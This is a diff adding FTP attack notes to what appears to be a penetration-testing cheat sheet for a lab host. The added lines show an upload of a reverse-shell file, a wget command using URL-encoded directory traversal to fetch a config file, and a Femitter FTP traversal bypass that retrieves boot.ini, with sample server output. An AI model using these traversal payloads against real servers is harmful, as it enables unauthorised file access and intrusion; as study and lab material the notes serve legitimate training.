@@ -62,10 +62,27 @@ $ ftp 10.11.1.125
 ftp://10.11.1.125
 ```
 
-Get / Put files:
-```
+File get/put methods:
+```bash
+# Standard
 ftp> get [ filename ]
 ftp> put reverse-shell.txt
+
+# Wget
+wget -r ftp://user:pass@10.11.1.125/\\..%2fConfigs%2fsettings.cfg
+```
+
+Directory traversal
+```bash
+# Navigating dirs with whitespaces
+ftp> ls ../../../../Docume~1/
+
+# Directory Traversal / Bypass (Femitter FTP)
+ftp> get ../\../\../\../\boot.ini
+200 Port command successful.
+150 Opening data connection for ../../../boot.ini.
+226 File sent ok
+ftp> dir ../\../\../\temp/
 ```
 
 ### SSH - TCP 22
